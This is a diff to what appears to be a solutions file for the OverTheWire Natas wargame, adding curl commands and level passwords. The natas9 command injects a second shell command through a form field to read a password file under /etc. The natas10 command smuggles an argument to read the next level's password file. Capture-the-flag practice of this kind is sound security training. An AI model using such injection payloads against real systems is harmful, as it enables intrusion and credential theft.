@@ -48,9 +48,14 @@ curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe --request POST --fo
 
 natas9
 ```
-curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --request POST --form 'submit=1' --form 'needle=wwwwww dictionary.txt; cat /etc/natas_webpass/natas10; touch' http://natas9.natas.labs.overthewire.org
+curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --request POST --form 'needle=wwwwww dictionary.txt; cat /etc/natas_webpass/natas10; touch' http://natas9.natas.labs.overthewire.org
+```
+
+natas10
+```
+curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu --request POST --form 'needle=2 /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org
 ```
 
 `
-natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 `
